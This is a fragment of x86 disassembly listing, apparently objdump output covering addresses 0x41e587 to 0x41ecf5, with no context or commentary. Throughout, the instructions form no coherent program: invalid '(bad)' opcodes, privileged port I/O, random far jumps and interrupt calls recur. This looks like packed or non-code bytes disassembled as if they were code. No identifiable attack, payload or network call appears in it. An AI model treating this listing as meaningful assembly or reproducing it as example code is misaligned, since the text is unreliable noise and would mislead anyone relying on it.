  41e587:	jns    0x41e522
  41e589:	push   eax
  41e58a:	bound  edi,QWORD PTR [edi-0x15]
  41e58d:	cmovp  edx,DWORD PTR [edx-0x5cfff9ec]
  41e594:	je     0x41e583
  41e596:	les    esp,FWORD PTR [edi-0x36]
  41e599:	jl     0x41e5dc
  41e59b:	pop    eax
  41e59c:	xchg   ebx,eax
  41e59d:	bound  esp,QWORD PTR ds:0x1fd2f978
  41e5a3:	gs ins DWORD PTR es:[edi],dx
  41e5a5:	int3   
  41e5a6:	je     0x41e5b9
  41e5a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5a9:	sub    eax,0xb098a796
  41e5ae:	mov    cl,0x5f
  41e5b0:	shr    BYTE PTR [esi-0x7c],cl
  41e5b3:	sub    BYTE PTR [esi],ah
  41e5b5:	das    
  41e5b6:	xchg   esi,eax
  41e5b7:	push   ds
  41e5b8:	shl    DWORD PTR [ebx-0x7c],cl
  41e5bb:	ins    DWORD PTR es:[edi],dx
  41e5bc:	das    
  41e5bd:	rcr    BYTE PTR [esi-0x2],0xd2
  41e5c1:	adc    bh,dl
  41e5c3:	pop    ecx
  41e5c4:	sub    edx,DWORD PTR [ebx]
  41e5c6:	cmp    edi,esp
  41e5c8:	in     eax,0x91
  41e5ca:	jno    0x41e64b
  41e5cc:	mov    ebp,0xb04e1b6b
  41e5d1:	dec    ebp
  41e5d2:	loope  0x41e5d6
  41e5d4:	jo     0x41e5b6
  41e5d6:	or     edx,ebp
  41e5d8:	jmp    0x7509:0x2576e926
  41e5df:	push   edx
  41e5e0:	mov    ebx,0xab4273ba
  41e5e5:	(bad)  
  41e5e6:	cmc    
  41e5e7:	mov    edx,0xb7bd969e
  41e5ec:	int    0x61
  41e5ee:	cli    
  41e5ef:	fadd   st(3),st
  41e5f1:	stos   DWORD PTR es:[edi],eax
  41e5f2:	jg     0x41e5ef
  41e5f4:	pusha  
  41e5f5:	fs push ecx
  41e5f7:	out    0xbb,eax
  41e5f9:	or     al,0x9c
  41e5fb:	lods   eax,DWORD PTR ds:[esi]
  41e5fc:	jbe    0x41e5e1
  41e5fe:	mov    edx,0xab21b3ba
  41e603:	daa    
  41e604:	jl     0x41e65d
  41e606:	out    dx,al
  41e607:	mov    ebx,0xc7cbaaa9
  41e60c:	push   esi
  41e60d:	arpl   WORD PTR [ecx-0x7c],ax
  41e610:	mul    BYTE PTR [edx+0x6f]
  41e613:	jae    0x41e5a2
  41e615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e616:	cmp    BYTE PTR [edi],dh
  41e618:	jns    0x41e68b
  41e61a:	lahf   
  41e61b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e61c:	inc    esp
  41e61d:	bswap  esp
  41e61f:	loop   0x41e5b5
  41e621:	test   BYTE PTR [ecx-0x3ac339],ah
  41e627:	jb     0x41e653
  41e629:	add    dh,bh
  41e62b:	add    eax,0x33ea33a7
  41e630:	(bad)  
  41e631:	pop    ecx
  41e632:	dec    ecx
  41e633:	cld    
  41e634:	jno    0x41e65b
  41e636:	mov    ebp,0x6b08808e
  41e63b:	sbb    al,0xed
  41e63d:	mov    BYTE PTR [edx],bl
  41e63f:	ret    
  41e640:	push   ds
  41e641:	ss sub eax,0x9964d0ba
  41e647:	pop    esi
  41e648:	aam    0x71
  41e64a:	pop    ss
  41e64b:	test   eax,ebx
  41e64d:	and    DWORD PTR [ebx+0x1e],ebx
  41e650:	mov    ecx,0xea59b183
  41e655:	or     eax,0xd0002af2
  41e65a:	dec    edx
  41e65b:	inc    edx
  41e65c:	(bad)
  41e65f:	je     0x41e608
  41e661:	pop    ecx
  41e662:	fmul   st,st(4)
  41e664:	push   esp
  41e665:	jbe    0x41e5ec
  41e667:	lock nop
  41e669:	fisub  DWORD PTR [edx+0x51]
  41e66c:	adc    eax,0xe5d3b4d7
  41e671:	sub    eax,0xefa326ac
  41e676:	cmc    
  41e677:	xor    eax,0x44ff4f1d
  41e67c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e67d:	and    edx,edx
  41e67f:	adc    eax,DWORD PTR ds:0x938fb56c
  41e685:	mov    DWORD PTR [esi+0x62b5d1d],0x57e845ab
  41e68f:	sub    BYTE PTR [edi],bl
  41e691:	xchg   edi,ebp
  41e693:	test   BYTE PTR [ebx+ebp*4+0x36],dh
  41e697:	rol    BYTE PTR [ebp-0x34],0x99
  41e69b:	test   BYTE PTR [edi+edi*2-0x552d981],ch
  41e6a2:	mov    al,cl
  41e6a4:	and    esi,esi
  41e6a6:	cmc    
  41e6a7:	jp     0x41e69c
  41e6a9:	push   0x1f
  41e6ab:	jae    0x41e6c3
  41e6ad:	pop    ebx
  41e6ae:	add    ecx,DWORD PTR [ebp+0x5d838643]
  41e6b4:	mov    ch,0xf8
  41e6b6:	xchg   esi,eax
  41e6b7:	pushf  
  41e6b8:	out    0xe4,eax
  41e6ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6bb:	fld    DWORD PTR [edx+0x4d]
  41e6be:	(bad)  
  41e6c1:	inc    edi
  41e6c2:	retf   0x9cb2
  41e6c5:	cmp    eax,0xd61a4d20
  41e6ca:	push   0x8cf524a4
  41e6cf:	mov    ds:0xd03a3d24,al
  41e6d4:	repnz mov bh,0x58
  41e6d7:	out    0x24,al
  41e6d9:	stc    
  41e6da:	out    0xa5,al
  41e6dc:	jnp    0x41e6a2
  41e6de:	sbb    ebx,DWORD PTR [edx+0x30807f0b]
  41e6e4:	es (bad) 
  41e6e6:	mov    eax,0x68809e19
  41e6eb:	sub    dh,BYTE PTR [esi+eax*2]
  41e6ee:	call   0x2712f014
  41e6f3:	add    ch,BYTE PTR [esi-0x2f]
  41e6f6:	in     al,0x37
  41e6f8:	sub    BYTE PTR [edi],dh
  41e6fa:	shl    cl,cl
  41e6fc:	popf   
  41e6fd:	loopne 0x41e6f7
  41e6ff:	push   cs
  41e700:	adc    DWORD PTR ds:0xac57154d,edx
  41e706:	ins    DWORD PTR es:[edi],dx
  41e707:	dec    edi
  41e708:	clc    
  41e709:	ret    
  41e70a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e70b:	sbb    ebp,DWORD PTR [edi]
  41e70d:	xlat   BYTE PTR ds:[ebx]
  41e70e:	pop    es
  41e70f:	ins    BYTE PTR es:[edi],dx
  41e710:	dec    esi
  41e711:	adc    eax,0x789b60b7
  41e716:	push   ebp
  41e717:	mov    esp,0x5cc06e71
  41e71c:	sub    BYTE PTR [edx],dl
  41e71e:	and    dh,ah
  41e720:	mov    eax,ds:0xd7e47308
  41e725:	pop    ecx
  41e726:	mov    eax,0x7c819b89
  41e72b:	mov    DWORD PTR [ebx+0x3e],0xb2058fce
  41e732:	sbb    ch,bl
  41e734:	scas   eax,DWORD PTR es:[edi]
  41e735:	aas    
  41e736:	push   eax
  41e737:	stc    
  41e738:	push   ss
  41e739:	inc    ecx
  41e73a:	rcl    BYTE PTR [ecx+0x21c4b032],cl
  41e740:	pop    eax
  41e741:	adc    BYTE PTR [edi+0x3e],bl
  41e744:	or     eax,0x7ea3d48e
  41e749:	xchg   ebp,eax
  41e74a:	jl     0x41e7b8
  41e74c:	xchg   DWORD PTR [esi-0x15],esi
  41e74f:	and    al,0x13
  41e751:	and    bh,BYTE PTR [eax+0x756759bf]
  41e757:	add    dh,BYTE PTR [esi]
  41e759:	pop    ds
  41e75a:	retf   
  41e75b:	and    BYTE PTR [edi-0x6ed85c6a],bh
  41e761:	pusha  
  41e762:	inc    edi
  41e763:	imul   eax,DWORD PTR [ebp+0x3],0x4f1a39a6
  41e76a:	push   ecx
  41e76b:	rcl    DWORD PTR [edi+0x50411202],0x76
  41e772:	pop    edi
  41e773:	mov    cl,BYTE PTR [eax+eiz*1-0x3a66d0e6]
  41e77a:	lods   al,BYTE PTR ds:[esi]
  41e77b:	jmp    0x274d8e58
  41e780:	mov    cl,0xaf
  41e782:	and    bh,BYTE PTR [esi]
  41e784:	call   0xf52d4a33
  41e789:	outs   dx,BYTE PTR ds:[esi]
  41e78a:	fbstp  TBYTE PTR [ecx+edx*2-0x3c]
  41e78e:	pop    edi
  41e78f:	ins    BYTE PTR es:[edi],dx
  41e790:	out    0xe4,eax
  41e792:	mov    esp,0x4fc8ccb4
  41e797:	fwait
  41e798:	xchg   edx,eax
  41e799:	sahf   
  41e79a:	mov    ?,WORD PTR [ecx]
  41e79c:	inc    esp
  41e79d:	sub    eax,0xb4088078
  41e7a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7a3:	bound  edi,QWORD PTR [edi]
  41e7a5:	inc    edx
  41e7a6:	and    BYTE PTR [ebx-0x5e],0x94
  41e7aa:	loop   0x41e7cc
  41e7ac:	jo     0x41e78c
  41e7ae:	scas   eax,DWORD PTR es:[edi]
  41e7af:	jo     0x41e7ed
  41e7b1:	mov    ebp,0x68e5389c
  41e7b6:	mov    ebp,DWORD PTR [eax+0x26b6976f]
  41e7bc:	jl     0x41e7a2
  41e7be:	rcr    BYTE PTR ds:0x7bd52952,1
  41e7c4:	add    edi,0xffffffd4
  41e7c7:	jp     0x41e766
  41e7c9:	mov    BYTE PTR [ebx+0x63270116],bl
  41e7cf:	aas    
  41e7d0:	into   
  41e7d1:	ins    BYTE PTR es:[edi],dx
  41e7d2:	lds    esi,FWORD PTR [ebp+0x4d286b1b]
  41e7d8:	pusha  
  41e7d9:	inc    eax
  41e7da:	sbb    eax,0xaec6fa4f
  41e7df:	xchg   edi,eax
  41e7e0:	pop    ds
  41e7e1:	jmp    0x4a19:0x34164d8e
  41e7e8:	mov    ds:0xf9fd25a8,eax
  41e7ed:	pop    esp
  41e7ee:	xchg   BYTE PTR [ebx+ecx*1],ch
  41e7f1:	shl    BYTE PTR [ebx-0x7ef4a649],cl
  41e7f7:	stos   DWORD PTR es:[edi],eax
  41e7f8:	bound  esp,QWORD PTR [edi+eax*8+0x60]
  41e7fc:	xchg   BYTE PTR [ebp-0x29],dl
  41e7ff:	mov    dl,0x87
  41e801:	or     BYTE PTR [ebp-0x34b3ccb3],cl
  41e807:	and    ah,BYTE PTR [edi+0xe624122]
  41e80d:	pop    es
  41e80e:	pop    ecx
  41e80f:	mov    ch,0xff
  41e811:	in     al,0x95
  41e813:	fisttp DWORD PTR [edx+0x5d]
  41e816:	push   0xffffff8a
  41e818:	(bad)  
  41e819:	cmp    al,0xde
  41e81b:	jl     0x41e7a5
  41e81d:	inc    ebx
  41e81e:	int3   
  41e81f:	push   edx
  41e820:	or     BYTE PTR [ecx-0xb6f7a50],dl
  41e826:	out    dx,al
  41e827:	fstp   QWORD PTR [ecx+0x18de26cb]
  41e82d:	out    0x3b,eax
  41e82f:	aaa    
  41e830:	(bad)  
  41e831:	xchg   ecx,eax
  41e832:	retf   0xcdf4
  41e835:	out    0xa7,al
  41e837:	pop    ebp
  41e838:	push   edx
  41e839:	mov    al,0x2b
  41e83b:	retf   
  41e83c:	jmp    0x805:0xdb29264c
  41e843:	xor    bl,BYTE PTR [edx]
  41e845:	adc    bh,BYTE PTR ds:0xa70a2518
  41e84b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e84c:	sti    
  41e84d:	test   bl,bh
  41e84f:	mov    BYTE PTR ds:0x28d63b21,ch
  41e855:	hlt    
  41e856:	xchg   BYTE PTR [eax+0x79],ch
  41e859:	or     eax,0xc680b00d
  41e85e:	jmp    0xc285:0x3f955caa
  41e865:	aam    0x6a
  41e867:	movhps xmm5,QWORD PTR [ebp-0x74]
  41e86b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e86c:	jmp    0x41e7fc
  41e86e:	xchg   si,ax
  41e870:	(bad)  
  41e871:	jmp    0xf5edc14c
  41e876:	mov    al,0x78
  41e878:	mov    eax,DWORD PTR [ecx]
  41e87a:	lds    ecx,FWORD PTR [eax-0x50]
  41e87d:	ret    0x3d03
  41e880:	loope  0x41e880
  41e882:	int    0x2d
  41e884:	aas    
  41e885:	nop
  41e886:	cwde   
  41e887:	ret    
  41e888:	mov    al,ds:0x96565563
  41e88d:	call   0x263540d5
  41e892:	dec    ebp
  41e893:	inc    eax
  41e894:	call   0x508e606c
  41e899:	iret   
  41e89a:	popa   
  41e89b:	mov    dh,0x59
  41e89d:	retf   
  41e89e:	iret   
  41e89f:	xor    eax,0xd6aa278e
  41e8a4:	(bad)  
  41e8a5:	popa   
  41e8a6:	lods   eax,DWORD PTR ds:[esi]
  41e8a7:	hlt    
  41e8a8:	add    ecx,DWORD PTR ss:[ebp-0x58257e6e]
  41e8af:	sbb    al,0x4d
  41e8b1:	adc    DWORD PTR [edi],esi
  41e8b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8b4:	imul   esp,DWORD PTR [esi-0x42],0xffffffd0
  41e8b8:	repnz inc eax
  41e8ba:	ds mov edi,esp
  41e8bd:	fld    TBYTE PTR [edx]
  41e8bf:	sub    BYTE PTR [esi-0x481df9f4],ch
  41e8c5:	xor    BYTE PTR [ebp+edi*4+0x3c],bl
  41e8c9:	icebp  
  41e8ca:	test   DWORD PTR [edi],ebx
  41e8cc:	sbb    ecx,esp
  41e8ce:	xor    DWORD PTR [eax],0x10cf7bf1
  41e8d4:	adc    eax,0x4f4a6179
  41e8d9:	xchg   esp,eax
  41e8da:	outs   dx,DWORD PTR ds:[esi]
  41e8db:	and    eax,0x946fa489
  41e8e0:	jb     0x41e8ac
  41e8e2:	push   ebp
  41e8e3:	pop    edi
  41e8e4:	or     edx,esp
  41e8e6:	jb     0x41e874
  41e8e8:	pop    esp
  41e8e9:	sbb    BYTE PTR [edi+0x49],cl
  41e8ec:	mov    al,0x9b
  41e8ee:	mov    edi,0xb5b1ffa
  41e8f3:	mov    esp,0x7b062d58
  41e8f8:	xchg   ecx,eax
  41e8f9:	icebp  
  41e8fa:	psllq  mm3,QWORD PTR [ebx-0x5e2b37c6]
  41e901:	stos   BYTE PTR es:[edi],al
  41e902:	jno    0x41e926
  41e904:	sub    dl,BYTE PTR [edi+0x49]
  41e907:	jle    0x41e8ee
  41e909:	sahf   
  41e90a:	sar    ah,cl
  41e90c:	cli    
  41e90d:	cmp    ch,BYTE PTR [ecx+eiz*1-0x19]
  41e911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e912:	xor    esp,DWORD PTR [edx]
  41e914:	mov    eax,0xee78bcc3
  41e919:	jnp    0x41e99a
  41e91b:	inc    edi
  41e91c:	aad    0x57
  41e91e:	jns    0x41e8c7
  41e920:	and    BYTE PTR [ecx],bh
  41e922:	cmp    DWORD PTR [edx-0x3a],esi
  41e925:	lea    eax,[ecx-0x7d]
  41e928:	fwait
  41e929:	mul    BYTE PTR [eax-0xae7e7d2]
  41e92f:	pop    esp
  41e930:	xchg   BYTE PTR [eax+0x54e612c7],cl
  41e936:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e937:	nop
  41e938:	adc    al,0xb0
  41e93a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e93b:	(bad)  
  41e93c:	push   edi
  41e93d:	cmp    cl,dh
  41e93f:	jbe    0x41e918
  41e941:	icebp  
  41e942:	xchg   ebx,eax
  41e943:	imul   edx,esp,0x44572034
  41e949:	into   
  41e94a:	add    eax,0x5fe69a4
  41e94f:	push   ebp
  41e950:	cli    
  41e951:	jmp    DWORD PTR [ecx+0x7218e0ea]
  41e957:	add    cl,BYTE PTR ds:0x280deaad
  41e95d:	adc    DWORD PTR [eax],ebp
  41e95f:	int3   
  41e960:	mov    ebp,DWORD PTR [edx+edx*2-0x6810c873]
  41e967:	dec    esi
  41e968:	pop    ecx
  41e969:	inc    eax
  41e96a:	sub    eax,0xd6f31074
  41e96f:	out    dx,al
  41e970:	icebp  
  41e971:	lahf   
  41e972:	out    0xbf,al
  41e974:	aad    0xd0
  41e976:	mov    edx,0xafc6dfeb
  41e97b:	hlt    
  41e97c:	test   DWORD PTR [esp+ecx*1+0x32ed8739],0xe79dae36
  41e987:	scas   eax,DWORD PTR es:[edi]
  41e988:	mov    dh,0xb3
  41e98a:	imul   ebx,DWORD PTR [ecx-0x7d2565db],0xffffffdd
  41e991:	(bad)  
  41e992:	mov    edx,0x3363e974
  41e997:	mov    esp,0x811a8cb2
  41e99c:	shl    BYTE PTR [edx],1
  41e99e:	adc    BYTE PTR [ebp+0x3a],dh
  41e9a1:	push   esp
  41e9a2:	push   0xbc6bbd7e
  41e9a7:	push   eax
  41e9a8:	mov    ebx,0x6e5ca4b5
  41e9ad:	int3   
  41e9ae:	jmp    0xaca:0xdf64c3ad
  41e9b5:	aad    0xab
  41e9b7:	xor    DWORD PTR [esi-0x34],ebp
  41e9ba:	jno    0x41ea23
  41e9bc:	mov    cl,0xb4
  41e9be:	arpl   dx,cx
  41e9c0:	and    edi,DWORD PTR [edi]
  41e9c2:	adc    edi,DWORD PTR [edi-0x63eb6c24]
  41e9c8:	mov    esi,0x8fd54f7
  41e9cd:	mov    ah,0xba
  41e9cf:	jmp    0x1321:0xa8c25052
  41e9d6:	push   0x1b
  41e9d8:	into   
  41e9d9:	push   esi
  41e9da:	add    al,0xe2
  41e9dc:	call   0x79e1:0x5e2fc245
  41e9e3:	loop   0x41e9c8
  41e9e5:	pop    ds
  41e9e6:	fcom   st(0)
  41e9e8:	ins    DWORD PTR es:[edi],dx
  41e9e9:	fwait
  41e9ea:	sub    BYTE PTR [esi-0x4b5f7525],cl
  41e9f0:	jge    0x41ea1a
  41e9f2:	rol    DWORD PTR [edx-0x392a3708],1
  41e9f8:	fsubr  DWORD PTR [ebx]
  41e9fa:	xor    eax,0xcc3ab0b1
  41e9ff:	add    BYTE PTR [edx],bl
  41ea01:	push   0x5a404dc2
  41ea06:	out    dx,eax
  41ea07:	test   DWORD PTR [eax+ebp*1+0x1d],ecx
  41ea0b:	inc    edx
  41ea0c:	aad    0x10
  41ea0e:	dec    edi
  41ea0f:	jmp    0xfaddd134
  41ea14:	dec    eax
  41ea15:	sbb    ecx,ecx
  41ea17:	jge    0x41ea8b
  41ea19:	sbb    al,0x15
  41ea1b:	shr    eax,0xb3
  41ea1e:	xor    ah,BYTE PTR [eax+eiz*2-0x760273b2]
  41ea25:	shr    DWORD PTR fs:[eax],0x5d
  41ea29:	mov    eax,ds:0xaf4be8e3
  41ea2e:	cmp    cl,bh
  41ea30:	mov    edi,0x337595eb
  41ea35:	test   BYTE PTR [eax+0x51],0x40
  41ea39:	mov    edi,cs
  41ea3b:	push   0xffffff96
  41ea3d:	jbe    0x41e9f1
  41ea3f:	int3   
  41ea40:	std    
  41ea41:	xchg   BYTE PTR [ebx-0x36],cl
  41ea44:	jecxz  0x41e9e9
  41ea46:	jns    0x41ea36
  41ea48:	mov    DWORD PTR [edx-0x1c6b1893],edx
  41ea4e:	inc    edi
  41ea4f:	xor    al,0x47
  41ea51:	retf   
  41ea52:	inc    ebx
  41ea53:	xchg   esi,eax
  41ea54:	push   ds
  41ea55:	outs   dx,DWORD PTR ds:[esi]
  41ea56:	call   0x3afebb8d
  41ea5b:	cmp    ebx,esi
  41ea5d:	inc    ecx
  41ea5e:	das    
  41ea5f:	and    ch,bh
  41ea61:	cs mov ebp,0x3be6c782
  41ea67:	in     al,dx
  41ea68:	clc    
  41ea69:	icebp  
  41ea6a:	sub    eax,0xfe749646
  41ea6f:	sub    DWORD PTR [esi+0x3c],eax
  41ea72:	fwait
  41ea73:	dec    ebp
  41ea74:	cmp    eax,0xba3bc2
  41ea79:	sbb    al,BYTE PTR [ecx]
  41ea7b:	shr    DWORD PTR [edi+eiz*2],0x19
  41ea7f:	adc    BYTE PTR [edx],ch
  41ea81:	jl     0x41ea9e
  41ea83:	xlat   BYTE PTR ds:[ebx]
  41ea84:	icebp  
  41ea85:	retf   0x181f
  41ea88:	int    0x5f
  41ea8a:	push   cs
  41ea8b:	ret    0x93f1
  41ea8e:	sar    BYTE PTR [esi+0x45cb6352],cl
  41ea94:	inc    ebp
  41ea95:	fdivrp st(5),st
  41ea97:	(bad)  
  41ea98:	pop    ebp
  41ea99:	daa    
  41ea9a:	test   ecx,ebx
  41ea9c:	outs   dx,BYTE PTR ds:[esi]
  41ea9d:	div    DWORD PTR ds:0xdcd1d82d
  41eaa3:	jnp    0x41ea40
  41eaa5:	mov    ds:0xe7c70c70,al
  41eaaa:	fisub  WORD PTR [edi-0x26428d13]
  41eab0:	xor    al,0xea
  41eab2:	jle    0x41eae1
  41eab4:	fnstcw WORD PTR [edx-0x372c972c]
  41eaba:	fcom   DWORD PTR [ebx-0x45]
  41eabd:	test   BYTE PTR [eax+0x42],ah
  41eac0:	xor    al,0xf6
  41eac2:	xchg   ebp,eax
  41eac4:	cmp    ah,BYTE PTR [esi+0x3e]
  41eac7:	add    eax,0x4335902e
  41eacc:	fdivr  st,st(4)
  41eace:	or     bl,BYTE PTR [ebx+edi*8]
  41ead1:	sahf   
  41ead2:	xchg   ecx,eax
  41ead3:	and    al,0x6b
  41ead5:	inc    ebx
  41ead6:	xor    BYTE PTR [ecx+0x6b9dea89],bl
  41eadc:	loopne 0x41eb09
  41eade:	sbb    al,0x14
  41eae0:	retf   
  41eae1:	xlat   BYTE PTR ds:[ebx]
  41eae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eae3:	out    dx,eax
  41eae4:	jo     0x41eadf
  41eae6:	or     al,0xcf
  41eae8:	cwde   
  41eae9:	fistp  DWORD PTR [eax-0x28]
  41eaec:	dec    edx
  41eaed:	sbb    al,0x89
  41eaef:	push   ds
  41eaf0:	push   cs
  41eaf1:	sub    BYTE PTR [eax+edx*1+0x43],al
  41eaf5:	mov    gs,WORD PTR [edx+0x7d]
  41eaf8:	push   eax
  41eaf9:	mov    eax,ds:0x90fb5243
  41eafe:	push   ss
  41eaff:	mov    esp,0x4951a020
  41eb04:	pop    ebx
  41eb05:	mov    cl,cl
  41eb07:	fnstcw WORD PTR [edx]
  41eb09:	ja     0x41eac4
  41eb0b:	sub    bl,BYTE PTR [edx]
  41eb0d:	mov    ebx,0xf9ac255f
  41eb12:	out    0xf0,al
  41eb14:	jmp    0xcf27:0x4a82171e
  41eb1b:	shl    DWORD PTR [ebp+0x43706b66],1
  41eb21:	add    ah,bl
  41eb23:	jb     0xee6c0ab4
  41eb29:	jo     0x41eafc
  41eb2b:	neg    cl
  41eb2d:	jecxz  0x41eabc
  41eb2f:	ret    
  41eb30:	push   es
  41eb31:	jns    0x41eae0
  41eb33:	pop    edx
  41eb34:	and    ecx,eax
  41eb36:	fnstcw WORD PTR [esi-0x7814b75b]
  41eb3c:	adc    al,0x88
  41eb3e:	in     al,dx
  41eb3f:	inc    esp
  41eb40:	xchg   DWORD PTR [edx+ebx*4],ebp
  41eb43:	pusha  
  41eb44:	aaa    
  41eb45:	ret    0x9e0
  41eb48:	add    eax,0xe73f040a
  41eb4d:	mov    esp,0x913bacfa
  41eb52:	lahf   
  41eb53:	jmp    0x8df27d26
  41eb58:	xchg   edx,eax
  41eb59:	mov    esi,cs
  41eb5b:	xchg   esp,eax
  41eb5c:	repz mov ch,0x5e
  41eb5f:	scas   eax,DWORD PTR es:[edi]
  41eb60:	out    dx,eax
  41eb61:	cmp    ebx,edx
  41eb63:	stc    
  41eb64:	jmp    0x6de6c112
  41eb69:	jmp    DWORD PTR [eax-0x32ac0c5a]
  41eb6f:	push   esp
  41eb70:	jbe    0x41eb66
  41eb72:	fbstp  TBYTE PTR [ebx+0x13a3d28a]
  41eb78:	inc    eax
  41eb79:	aad    0x9f
  41eb7b:	scas   eax,DWORD PTR es:[edi]
  41eb7c:	xchg   ecx,eax
  41eb7d:	stos   DWORD PTR es:[edi],eax
  41eb7e:	xchg   ebp,eax
  41eb7f:	pusha  
  41eb80:	lods   al,BYTE PTR ds:[esi]
  41eb81:	inc    esp
  41eb82:	sub    esp,DWORD PTR [edx-0x3a]
  41eb85:	sar    DWORD PTR ds:0xf7ab22b1,cl
  41eb8b:	cli    
  41eb8c:	imul   edx,ebp,0xc33e0815
  41eb92:	(bad)  
  41eb93:	mov    ebx,edx
  41eb95:	in     al,dx
  41eb96:	pop    ecx
  41eb97:	push   edx
  41eb98:	mov    esi,0x30422996
  41eb9d:	pop    es
  41eb9e:	leave  
  41eb9f:	xchg   ebx,eax
  41eba0:	or     dh,BYTE PTR [ebx+0x681e4e20]
  41eba6:	fimul  WORD PTR [edi-0x47a6d02e]
  41ebac:	xor    DWORD PTR [esi+0x4ac6b66d],esp
  41ebb2:	loope  0x41ec1e
  41ebb4:	shl    edi,cl
  41ebb6:	out    dx,eax
  41ebb7:	mov    esi,0xc58a8d7d
  41ebbc:	int3   
  41ebbd:	arpl   WORD PTR [edx-0x56f6cedd],dx
  41ebc3:	push   edi
  41ebc4:	push   esi
  41ebc5:	mov    eax,0x61e0312c
  41ebca:	xor    BYTE PTR [ebx],0x3e
  41ebcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebce:	lahf   
  41ebcf:	jle    0x41eb56
  41ebd1:	jnp    0x41eb56
  41ebd3:	inc    esp
  41ebd4:	add    BYTE PTR [ecx],bh
  41ebd6:	leave  
  41ebd7:	in     al,dx
  41ebd8:	gs mov dh,0x99
  41ebdb:	jge    0x41ec26
  41ebdd:	aas    
  41ebde:	enter  0xbab4,0x92
  41ebe2:	hlt    
  41ebe3:	pop    ss
  41ebe4:	lahf   
  41ebe5:	inc    esp
  41ebe6:	push   ecx
  41ebe7:	cmp    ebx,edx
  41ebe9:	pop    esi
  41ebea:	inc    esi
  41ebeb:	pop    ds
  41ebec:	das    
  41ebed:	sar    esp,1
  41ebef:	ss sub al,0xd1
  41ebf2:	out    0xe2,al
  41ebf4:	push   edi
  41ebf5:	and    BYTE PTR [edi],al
  41ebf7:	push   ebp
  41ebf8:	cs pop ds
  41ebfa:	outs   dx,BYTE PTR ds:[esi]
  41ebfb:	and    al,0xe
  41ebfd:	xchg   ecx,eax
  41ebfe:	adc    ebp,esi
  41ec00:	push   cs
  41ec01:	fmul   DWORD PTR ds:0x9a201467
  41ec07:	into   
  41ec08:	pop    si
  41ec0a:	mov    al,0x84
  41ec0c:	or     al,0x70
  41ec0e:	dec    esi
  41ec0f:	cmp    DWORD PTR ds:0x1e3ba55,eax
  41ec15:	cmp    BYTE PTR [ebp-0x3d],dl
  41ec18:	lds    ecx,FWORD PTR [ebp+0x78]
  41ec1b:	dec    ebp
  41ec1c:	and    eax,0x3ad311b2
  41ec21:	mov    esp,0x8f72b47c
  41ec26:	mov    ch,0xb
  41ec28:	aad    0xcf
  41ec2a:	dec    edx
  41ec2b:	and    eax,0x25c55319
  41ec30:	jl     0x41ec42
  41ec32:	arpl   WORD PTR [esi-0x3668c063],cx
  41ec38:	xchg   BYTE PTR [edi+0x6a],bl
  41ec3b:	dec    esi
  41ec3c:	mov    edi,0x82e79b6a
  41ec41:	cli    
  41ec42:	ss push ebx
  41ec44:	cmp    bl,BYTE PTR [ebp+ebp*8-0x4ee4b856]
  41ec4b:	test   DWORD PTR [ecx+esi*2],edx
  41ec4e:	adc    edx,DWORD PTR [esi]
  41ec50:	fs fst DWORD PTR gs:[edx-0x2d31a50e]
  41ec58:	cmp    al,0xae
  41ec5a:	fwait
  41ec5b:	and    BYTE PTR [esi+esi*8+0x2d],0xfb
  41ec60:	inc    eax
  41ec61:	repz sub DWORD PTR [ebx],edx
  41ec64:	jo     0x41ec61
  41ec66:	mov    ebp,0x34945c95
  41ec6b:	inc    ecx
  41ec6c:	imul   ebp,DWORD PTR [edi-0xea94c07],0xffffffa5
  41ec73:	xchg   ebx,ecx
  41ec75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec76:	push   ecx
  41ec77:	ret    
  41ec78:	jno    0x41ec7d
  41ec7a:	jmp    0xbf03d776
  41ec7f:	outs   dx,DWORD PTR ds:[esi]
  41ec80:	fmulp  st(2),st
  41ec82:	sbb    edi,DWORD PTR [ebx]
  41ec84:	cmp    ch,BYTE PTR [ebp-0x782d9b0d]
  41ec8a:	in     eax,dx
  41ec8b:	pop    eax
  41ec8c:	or     esi,DWORD PTR [edi]
  41ec8e:	pop    ecx
  41ec8f:	dec    ecx
  41ec90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec91:	mov    ebx,0xd191139
  41ec96:	pop    esi
  41ec97:	mov    ebx,0xebe74b9b
  41ec9c:	int3   
  41ec9d:	mov    bh,0x94
  41ec9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eca0:	jo     0x41ecb3
  41eca2:	mov    ds:0x839d4bf7,al
  41eca7:	jmp    0x654e:0x9412d10f
  41ecae:	mov    ds:0x74fc65b7,eax
  41ecb3:	jmp    0x8915:0x8e9eb212
  41ecba:	sub    esp,DWORD PTR [ecx-0x337505b5]
  41ecc0:	int    0x2
  41ecc2:	test   eax,0x85d0c13d
  41ecc7:	jp     0x41ed2e
  41ecc9:	inc    eax
  41ecca:	mov    al,ds:0xee84f2ca
  41eccf:	inc    esp
  41ecd0:	icebp  
  41ecd1:	xor    eax,0x205ef0d6
  41ecd6:	or     ebp,edx
  41ecd8:	nop
  41ecd9:	daa    
  41ecda:	gs in  al,0xed
  41ecdd:	(bad)  
  41ecde:	aaa    
  41ecdf:	jecxz  0x41ecd9
  41ece1:	jbe    0x41eca0
  41ece3:	fabs   
  41ece5:	out    0x5f,eax
  41ece7:	xchg   DWORD PTR [ebp-0x42],ebx
  41ecea:	enter  0xdb2d,0xa8
  41ecee:	idiv   ah
  41ecf0:	mov    ch,0xf2
  41ecf2:	adc    cl,BYTE PTR [ebx+0x18]
  41ecf5:	push   ebx
